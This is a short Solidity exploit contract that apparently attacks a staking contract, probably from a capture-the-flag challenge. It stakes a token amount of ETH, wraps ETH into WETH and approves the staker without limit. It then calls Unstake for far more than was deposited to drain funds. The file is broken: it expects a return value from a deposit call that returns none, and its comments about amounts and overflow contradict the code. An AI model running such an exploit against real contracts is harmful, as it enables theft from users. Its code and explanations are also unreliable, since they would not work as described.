pragma solidity ^0.8.0;
interface IWETH {
    function deposit() external payable;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}
contract Exploit {
    address public WETH = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    address public stake = 0xB7A5bd0345EF1Cc5E66bf61BdeC17D2461fBd968;

    function startExploit() external payable {
        // Stake ETH to become a staker (minimum 0.001 ETH)
        (bool success1,) = stake.call{value: 0.001 ether}(new bytes(0));
        require(success1, "Stake ETH failed");

        // Deposit ETH into WETH (but we never pulled it back)
        (bool success2,) = IWETH(WETH).deposit{value: address(this).balance}();
        require(success2, "WETH deposit failed");

        // Approve all WETH to stake
        bool success3 = IWETH(WETH).approve(stake, type(uint256).max);
        require(success3, "Approve failed");

        // Now stake 1000000 WETH, but we only deposited 0.001 ETH = 0.001 WETH
        // So we are taking 1000000 - 0.001 = 999999.999 extra which will overflow
        bytes4 selector = bytes4(keccak256("StakeWETH(uint256)"));
        (bool success4,) = stake.call(abi.encodeWithSelector(selector, 1 ether)); // use 1 ether as the amount
        require(success4, "StakeWETH failed");

        // Vulnerability: withdrawal without checking that the amount is not more than what is being taken
        bytes4 selector2 = bytes4(keccak256("Unstake(uint256)"));
        (bool success5,) = stake.call(abi.encodeWithSelector(selector2, 1000000 ether));
        require(success5, "Unstake failed");
    }

    receive() external payable {}
} 